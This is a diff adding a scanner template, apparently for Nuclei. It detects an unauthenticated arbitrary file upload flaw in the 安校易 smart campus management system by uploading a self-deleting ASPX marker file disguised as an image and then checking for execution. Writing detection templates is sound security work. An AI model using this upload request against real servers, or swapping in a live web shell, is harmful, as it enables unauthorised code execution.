@@ -1,0 +1,36 @@
+id: anxiaoyi-FileUpProductupdate-files-upload
+
+info:
+  name: 智慧校园(安校易)管理系统 FileUpProductupdate.aspx 任意文件上传漏洞
+  author: Superhero
+  severity: critical
+  description: 智慧校园(安校易)管理系统 FileUpProductupdate.aspx 接口处存在任意文件上传漏洞，未经身份验证的攻击者通过漏洞上传恶意后门文件，执行任意代码，从而获取到服务器权限。
+  tags: files-upload
+  
+http:
+  - raw:
+      - |
+        POST /Module/FileUpPage/FileUpProductupdate.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----21909179191068471382830692394
+
+
+        ------21909179191068471382830692394
+        Content-Disposition: form-data; name="Filedata"; filename="test.aspx"
+        Content-Type: image/jpeg
+
+        <%@Page Language="C#"%><%Response.Write("pboyjnnrfipmplsukdeczudsefxmywe");System.IO.File.Delete(Request.PhysicalPath);%>
+        ------21909179191068471382830692394--
+  - raw:
+      - |
+        GET /Upload/Publish/000000/0_0_0_0/update.aspx HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'pboyjnnrfipmplsukdeczudsefxmywe'
+      - type: status
+        status: 
+          - 200
